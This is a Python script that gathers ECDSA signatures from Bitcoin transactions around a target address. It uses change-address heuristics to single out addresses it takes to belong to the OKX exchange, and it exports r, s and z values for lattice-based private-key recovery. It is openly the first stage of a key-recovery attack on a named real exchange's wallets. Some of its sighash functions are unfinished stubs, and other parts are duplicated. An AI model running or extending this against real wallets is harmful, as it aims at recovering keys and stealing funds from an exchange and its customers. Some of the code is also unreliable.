#!/usr/bin/env python3
"""
OKX Signature Extractor for Lattice Attacks
-------------------------------------------
Given a target address (or list), this script:
- Fetches all related transactions via Blockstream API.
- Applies change-address heuristics to identify addresses that likely belong to the same wallet (OKX).
- Extracts ECDSA signatures (r, s) from each input, along with the message hash z.
- Outputs a CSV file with (address, r, s, z, txid, vin) for use in lattice reduction.

Inspired by in3rsha's low-level parsing approach.
"""

import requests
import hashlib
import csv
import sys
from binascii import unhexlify, hexlify
from collections import defaultdict

try:
    from bitcoinutils.transactions import Transaction
    from bitcoinutils.script import Script
    BITCOIN_UTILS_AVAILABLE = True
except ImportError:
    BITCOIN_UTILS_AVAILABLE = False
    print("⚠️  bitcoin-utils not installed. Install with: pip install bitcoin-utils")
    print("   z values will be marked as 'unknown'")

# ---------- SECP256K1 ----------
N = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141

def modinv(a, p=N):
    """Compute modular inverse using Fermat's little theorem."""
    return pow(a, p - 2, p)

# ---------- DER Signature Parser ----------
def parse_der_sig(sig_bytes):
    """
    Extract r and s from DER encoded signature bytes.
    Returns (r, s) or (None, None) on failure.
    """
    if len(sig_bytes) < 2 or sig_bytes[0] != 0x30:
        return None, None
    
    try:
        idx = 2
        if sig_bytes[idx] != 0x02:
            return None, None
        
        r_len = sig_bytes[idx + 1]
        r_bytes = sig_bytes[idx + 2:idx + 2 + r_len]
        # Remove leading zero if present (used for positive sign)
        if len(r_bytes) > 0 and r_bytes[0] == 0x00:
            r_bytes = r_bytes[1:]
        r = int.from_bytes(r_bytes, 'big')
        
        idx += 2 + r_len
        if idx >= len(sig_bytes) or sig_bytes[idx] != 0x02:
            return None, None
        
        s_len = sig_bytes[idx + 1]
        s_bytes = sig_bytes[idx + 2:idx + 2 + s_len]
        # Remove leading zero if present
        if len(s_bytes) > 0 and s_bytes[0] == 0x00:
            s_bytes = s_bytes[1:]
        s = int.from_bytes(s_bytes, 'big')
        
        return r, s
    except (IndexError, ValueError):
        return None, None

# ---------- Transaction Hex Parser ----------
def parse_transaction_inputs(tx_hex):
    """
    Parse a Bitcoin transaction hex to extract input information.
    Returns a list of dicts with scriptSig/witness data for each input.
    
    This is a simplified parser that extracts signature data from:
    - Legacy: scriptSig in each vin
    - SegWit: witness stack items
    """
    inputs_data = []
    
    try:
        tx_bytes = bytes.fromhex(tx_hex)
        pos = 0
        
        # Version (4 bytes)
        version = tx_bytes[pos:pos+4]
        pos += 4
        
        # Check for SegWit marker
        is_segwit = False
        if len(tx_bytes) > pos and tx_bytes[pos] == 0x00:
            pos += 1
            if len(tx_bytes) > pos and tx_bytes[pos] == 0x01:
                is_segwit = True
                pos += 1
        
        # Number of inputs (varint)
        if pos >= len(tx_bytes):
            return []
        num_inputs, pos = read_varint(tx_bytes, pos)
        
        for i in range(num_inputs):
            input_info = {'vin_index': i, 'signatures': [], 'is_segwit': is_segwit}
            
            # Previous txid (32 bytes)
            if pos + 32 > len(tx_bytes):
                break
            prev_txid = tx_bytes[pos:pos+32][::-1].hex()
            pos += 32
            
            # Previous vout (4 bytes)
            if pos + 4 > len(tx_bytes):
                break
            prev_vout = int.from_bytes(tx_bytes[pos:pos+4], 'little')
            pos += 4
            input_info['prev_vout'] = prev_vout
            input_info['prev_txid'] = prev_txid
            
            # Fetch previous output details for z computation
            try:
                prev_url = f'https://blockstream.info/api/tx/{prev_txid}'
                prev_data = requests.get(prev_url, timeout=10).json()
                if 'vout' in prev_data and prev_vout < len(prev_data['vout']):
                    vout = prev_data['vout'][prev_vout]
                    input_info['prev_script_pubkey'] = vout.get('scriptpubkey', '')
                    input_info['amount_sats'] = int(vout.get('value', 0))
            except:
                pass  # Will compute z later if data unavailable
            
            # ScriptSig length (varint)
            if pos >= len(tx_bytes):
                break
            scriptsig_len, pos = read_varint(tx_bytes, pos)
            
            # ScriptSig data
            if scriptsig_len > 0:
                if pos + scriptsig_len > len(tx_bytes):
                    break
                scriptsig = tx_bytes[pos:pos+scriptsig_len]
                pos += scriptsig_len
                input_info['scriptsig'] = scriptsig.hex()
                
                # Try to extract signatures from scriptSig
                sigs = extract_signatures_from_script(scriptsig)
                input_info['signatures'].extend(sigs)
            
            # Sequence (4 bytes)
            if pos + 4 > len(tx_bytes):
                break
            sequence = tx_bytes[pos:pos+4]
            pos += 4
            
            inputs_data.append(input_info)
        
        # If SegWit, skip outputs first then parse witness data
        if is_segwit:
            # Number of outputs (varint)
            if pos >= len(tx_bytes):
                return inputs_data
            num_outputs, pos = read_varint(tx_bytes, pos)
            
            # Skip all outputs
            for _ in range(num_outputs):
                if pos + 8 > len(tx_bytes):
                    break
                pos += 8  # amount
                if pos >= len(tx_bytes):
                    break
                spk_len, pos = read_varint(tx_bytes, pos)
                if pos + spk_len > len(tx_bytes):
                    break
                pos += spk_len  # scriptPubKey
            
            # Now parse witness data for each input
            if pos < len(tx_bytes):
                for i, inp in enumerate(inputs_data):
                    if pos >= len(tx_bytes):
                        break
                    
                    # Witness stack item count (varint)
                    witness_count, pos = read_varint(tx_bytes, pos)
                    
                    for j in range(witness_count):
                        if pos >= len(tx_bytes):
                            break
                        witness_item_len, pos = read_varint(tx_bytes, pos)
                        if pos + witness_item_len > len(tx_bytes):
                            break
                        witness_item = tx_bytes[pos:pos+witness_item_len]
                        pos += witness_item_len
                        
                        # Try to extract signature from witness item
                        sigs = extract_signatures_from_script(witness_item)
                        inputs_data[i]['signatures'].extend(sigs)
        
        return inputs_data
    
    except Exception as e:
        print(f"Error parsing transaction: {e}")
        import traceback
        traceback.print_exc()
        return []

def read_varint(data, pos):
    """Read a varint from data at position pos. Returns (value, new_pos)."""
    first_byte = data[pos]
    if first_byte < 0xfd:
        return first_byte, pos + 1
    elif first_byte == 0xfd:
        return int.from_bytes(data[pos+1:pos+3], 'little'), pos + 3
    elif first_byte == 0xfe:
        return int.from_bytes(data[pos+1:pos+5], 'little'), pos + 5
    else:  # 0xff
        return int.from_bytes(data[pos+1:pos+9], 'little'), pos + 9

def extract_signatures_from_script(script_bytes):
    """
    Extract DER-encoded signatures from a script (scriptSig or witness item).
    Returns list of (r, s, sighash_type) tuples.
    """
    signatures = []
    
    try:
        # Look for DER signature pattern: 0x30 [length] 0x02 [r_len] [r] 0x02 [s_len] [s] [sighash_type]
        i = 0
        while i < len(script_bytes) - 6:
            if script_bytes[i] == 0x30:
                # Check if this looks like a valid DER signature
                if i + 1 < len(script_bytes):
                    sig_len = script_bytes[i + 1]
                    if i + 2 + sig_len <= len(script_bytes):
                        sig_data = script_bytes[i:i + 2 + sig_len]
                        r, s = parse_der_sig(sig_data)
                        if r is not None and s is not None:
                            # Check for sighash type byte after signature
                            sighash_type = 1  # Default SIGHASH_ALL
                            if i + 2 + sig_len < len(script_bytes):
                                sighash_type = script_bytes[i + 2 + sig_len]
                            signatures.append((r, s, sighash_type))
                            i += 2 + sig_len + 1
                            continue
            i += 1
    except Exception:
        pass
    
    return signatures

# ---------- Compute SIGHASH (z) ----------
def get_sighash_z(tx_hex, vin_idx, script_pubkey_hex, amount_satoshis, is_segwit=False):
    """
    Compute the message hash (z) for a given input.
    
    For legacy transactions (P2PKH, P2SH):
    - Uses the legacy SIGHASH algorithm
    
    For SegWit transactions (P2WPKH, P2WSH, P2TR):
    - Uses BIP143 SIGHASH algorithm
    
    This is a simplified implementation. For production use, consider using
    a well-tested library like bitcoin-utils or btclib.
    """
    try:
        tx_bytes = bytes.fromhex(tx_hex)
        
        if is_segwit:
            # BIP143 SIGHASH for SegWit
            return compute_bip143_sighash(tx_bytes, vin_idx, script_pubkey_hex, amount_satoshis)
        else:
            # Legacy SIGHASH
            return compute_legacy_sighash(tx_bytes, vin_idx, script_pubkey_hex)
    
    except Exception as e:
        raise RuntimeError(f"Could not compute z: {e}")

def compute_bip143_sighash(tx_bytes, vin_idx, script_pubkey_hex, amount_satoshis):
    """Compute BIP143 SIGHASH for SegWit transactions."""
    # This is a simplified implementation
    # For full correctness, you need to handle all SegWit types properly
    
    # HashPrevouts
    prevouts_hash = hashlib.sha256(hashlib.sha256(b''.join([
        bytes.fromhex(inp.get('prev_txid', '0' * 64))[::-1] + 
        inp.get('prev_vout', 0).to_bytes(4, 'little')
        for inp in []  # Would need to parse all inputs
    ])).digest()).digest()
    
    # HashSequence
    sequence_hash = hashlib.sha256(hashlib.sha256(b''.join([
        b'\xff\xff\xff\xff'  # Default sequence
        for _ in []  # Would need to parse all inputs
    ])).digest()).digest()
    
    # For now, return a placeholder - proper implementation requires full tx parsing
    # In practice, use a library for this
    raise NotImplementedError("Full BIP143 implementation requires complete tx parsing. Use bitcoin-utils library.")

def compute_legacy_sighash(tx_bytes, vin_idx, script_pubkey_hex):
    """Compute legacy SIGHASH for pre-SegWit transactions."""
    # Simplified implementation for P2PKH
    # This creates a modified transaction with the scriptPubKey in place
    # and computes SHA256(SHA256(modified_tx))
    
    # For production use, implement the full SIGHASH algorithm or use a library
    raise NotImplementedError("Legacy SIGHASH computation requires full implementation. Use bitcoin-utils library.")

# ---------- Change-address detection ----------
def analyze_address_patterns(txs, target_address):
    """
    Analyze transaction patterns to identify likely exchange-controlled addresses.
    
    Key insight: For exchange withdrawal tracking, the target address is typically
    a customer deposit address that RECEIVES funds. The ACTUAL exchange-controlled
    addresses are the ones that SEND to it (appear as inputs in the same transaction).
    
    Heuristics:
    1. Addresses that appear as inputs in transactions where target is an output
    2. Addresses that appear frequently as inputs across multiple transactions
    3. Addresses that appear in multiple transactions (not one-time customer deposits)
    
    Returns a dict of {address: confidence_score}
    """
    addr_stats = {}
    
    for tx in txs:
        input_addresses = set()
        output_addresses = set()
        target_is_output = False
        
        # Collect input addresses
        for vin in tx.get('vin', []):
            prevout = vin.get('prevout', {})
            addr = prevout.get('scriptpubkey_address')
            if addr:
                input_addresses.add(addr)
        
        # Collect output addresses
        for vout in tx.get('vout', []):
            addr = vout.get('scriptpubkey_address')
            if addr:
                output_addresses.add(addr)
                if addr == target_address:
                    target_is_output = True
        
        # If target is in outputs, the input addresses are likely exchange-controlled
        if target_is_output:
            for addr in input_addresses:
                if addr not in addr_stats:
                    addr_stats[addr] = {
                        'input_count': 0,
                        'output_count': 0,
                        'send_to_target': 0,
                        'tx_ids': set()
                    }
                addr_stats[addr]['input_count'] += 1
                addr_stats[addr]['send_to_target'] += 1
                addr_stats[addr]['tx_ids'].add(tx['txid'])
        
        # Also track other patterns
        for addr in input_addresses:
            if addr not in addr_stats:
                addr_stats[addr] = {
                    'input_count': 0,
                    'output_count': 0,
                    'send_to_target': 0,
                    'tx_ids': set()
                }
            addr_stats[addr]['input_count'] += 1
            addr_stats[addr]['tx_ids'].add(tx['txid'])
        
        for addr in output_addresses:
            if addr not in addr_stats:
                addr_stats[addr] = {
                    'input_count': 0,
                    'output_count': 0,
                    'send_to_target': 0,
                    'tx_ids': set()
                }
            addr_stats[addr]['output_count'] += 1
            addr_stats[addr]['tx_ids'].add(tx['txid'])
    
    # Calculate confidence scores
    scored_addresses = {}
    for addr, stats in addr_stats.items():
        if addr == target_address:
            continue
        
        score = 0
        
        # Highest score: addresses that send to target multiple times
        if stats['send_to_target'] >= 1:
            score += 20 * stats['send_to_target']
        
        # High score for addresses that frequently appear as inputs
        if stats['input_count'] >= 3:
            score += 10 * stats['input_count']
        elif stats['input_count'] >= 1:
            score += 5 * stats['input_count']
        
        # Lower score for addresses that only appear as outputs (likely customers)
        if stats['output_count'] > 0 and stats['input_count'] == 0:
            score -= 10  # Penalize pure output addresses
        
        if score > 0:
            scored_addresses[addr] = score
    
    return scored_addresses

# ---------- Main extraction function ----------

# ---------- Compute SIGHASH (z) ----------
def compute_sighash_z(tx_hex, vin_index, prev_script_pubkey_hex, amount_sats):
    """
    Compute the message hash (z) for a given input using bitcoin-utils.
    Handles both legacy and SegWit transactions.
    Returns the z value as an integer, or None on failure.
    """
    if not BITCOIN_UTILS_AVAILABLE:
        return None
    
    try:
        tx = Transaction.from_raw(tx_hex)
        script_bytes = bytes.fromhex(prev_script_pubkey_hex)
        script = Script.from_raw(script_bytes)
        
        # Determine which digest method to use based on transaction type
        if tx.has_segwit:
            # SegWit transaction
            sighash = tx.get_transaction_segwit_digest(vin_index, script, amount_sats, 0x01)
        else:
            # Legacy transaction
            sighash = tx.get_transaction_digest(vin_index, script, 0x01)
        
        return int.from_bytes(sighash, 'big')
    except Exception as e:
        return None

def extract_signatures_for_address(target_address, output_csv="signatures.csv", max_addresses=None):
    """
    Fetch all transactions for target_address, extract signatures from all inputs
    that belong to addresses that share transactions with the target.
    Writes to CSV.
    
    Args:
        target_address: The starting address to scan from
        output_csv: Output CSV file path
        max_addresses: Maximum number of related addresses to scan (None = all)
    """
    print(f"🔍 Scanning address: {target_address}")
    
    # Step 1: Get all transactions for the target
    url = f"https://blockstream.info/api/address/{target_address}/txs"
    try:
        response = requests.get(url, timeout=15)
        response.raise_for_status()
        txs = response.json()
    except Exception as e:
        print(f"Error fetching txs: {e}")
        return
    
    if not txs:
        print("No transactions found for this address.")
        return
    
    print(f"📦 Found {len(txs)} transactions for target address.")
    
    # Step 2: Analyze address patterns to find likely exchange-controlled addresses
    addr_scores = analyze_address_patterns(txs, target_address)
    
    # Sort by score and take top addresses (use all if max_addresses is None)
    sorted_addrs = sorted(addr_scores.items(), key=lambda x: x[1], reverse=True)
    
    if max_addresses is None:
        likely_okx = [addr for addr, score in sorted_addrs]
    else:
        likely_okx = [addr for addr, score in sorted_addrs[:max_addresses]]
    
    print(f"🎯 Identified {len(likely_okx)} likely OKX-controlled addresses (scored by heuristic).")
    
    # Step 3: For each likely OKX address, fetch its transactions and extract signatures
    all_signatures = []
    processed_txs = set()  # Avoid processing same tx multiple times
    
    for addr in likely_okx:
        print(f"  Fetching txs for {addr}...")
        try:
            addr_response = requests.get(
                f"https://blockstream.info/api/address/{addr}/txs",
                timeout=15
            )
            addr_response.raise_for_status()
            addr_txs = addr_response.json()
        except Exception as e:
            print(f"    ⚠️  Error fetching txs for {addr}: {e}")
            continue
        
        for tx in addr_txs:
            txid = tx['txid']
            
            # Skip if already processed
            if txid in processed_txs:
                continue
            processed_txs.add(txid)
            
            # Get raw hex
            try:
                hex_response = requests.get(
                    f"https://blockstream.info/api/tx/{txid}/hex",
                    timeout=10
                )
                hex_response.raise_for_status()
                raw_hex = hex_response.text.strip()
            except Exception as e:
                print(f"    ⚠️  Could not fetch hex for {txid}: {e}")
                continue
            
            if not raw_hex:
                continue
            
            # Parse transaction and extract signatures
            inputs_data = parse_transaction_inputs(raw_hex)
            
            for input_info in inputs_data:
                vin_idx = input_info['vin_index']
                
                for r, s, sighash_type in input_info['signatures']:
                    # Try to get z (message hash) using bitcoin-utils
                    z_hex = "unknown"
                    if BITCOIN_UTILS_AVAILABLE and 'prev_script_pubkey' in input_info and 'amount_sats' in input_info:
                        try:
                            z_value = compute_sighash_z(raw_hex, vin_idx, input_info['prev_script_pubkey'], input_info['amount_sats'])
                            if z_value:
                                z_hex = hex(z_value)
                        except Exception as e:
                            pass
                    
                    all_signatures.append({
                        'address': addr,
                        'txid': txid,
                        'vin': vin_idx,
                        'r': hex(r),
                        's': hex(s),
                        'sighash_type': hex(sighash_type),
                        'z': z_hex
                    })
    
    # Step 4: Write to CSV
    with open(output_csv, 'w', newline='') as f:
        fieldnames = ['address', 'txid', 'vin', 'r', 's', 'sighash_type', 'z']
        writer = csv.DictWriter(f, fieldnames=fieldnames)
        writer.writeheader()
        writer.writerows(all_signatures)
    
    print(f"✅ Done. Extracted {len(all_signatures)} signatures. Saved to {output_csv}")
    print(f"\n📊 Summary:")
    print(f"   - Target address: {target_address}")
    print(f"   - Transactions scanned: {len(processed_txs)}")
    print(f"   - OKX addresses identified: {len(likely_okx)}")
    print(f"   - Signatures extracted: {len(all_signatures)}")
    print(f"\n⚠️  Note: z (message hash) computation requires bitcoin-utils library.")
    print(f"   Install with: pip install bitcoin-utils")
    print(f"   The r,s values can still be used for certain lattice attacks.")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python okx_sig_extractor.py <target_address> [output_csv] [max_addresses]")
        print("\nArguments:")
        print("  target_address   - The starting address to scan from")
        print("  output_csv       - Output CSV file (default: signatures.csv)")
        print("  max_addresses    - Max related addresses to scan (default: None = ALL)")
        print("\nExamples:")
        print("  # Scan ALL related addresses (full audit):")
        print("  python okx_sig_extractor.py 16rF2zwSJ9goQ9fZfYoti5LsUqqegb5RnA")
        print("\n  # Limit to first 50 addresses (quick test):")
        print("  python okx_sig_extractor.py 16rF2zwSJ9goQ9fZfYoti5LsUqqegb5RnA okx_sigs.csv 50")
        sys.exit(1)
    
    target = sys.argv[1]
    out = sys.argv[2] if len(sys.argv) > 2 else "signatures.csv"
    
    # Parse max_addresses: None means scan ALL, integer means limit
    if len(sys.argv) > 3:
        try:
            max_addr = int(sys.argv[3])
        except ValueError:
            max_addr = None
    else:
        max_addr = None  # Default to scanning ALL addresses
    
    extract_signatures_for_address(target, out, max_addr)
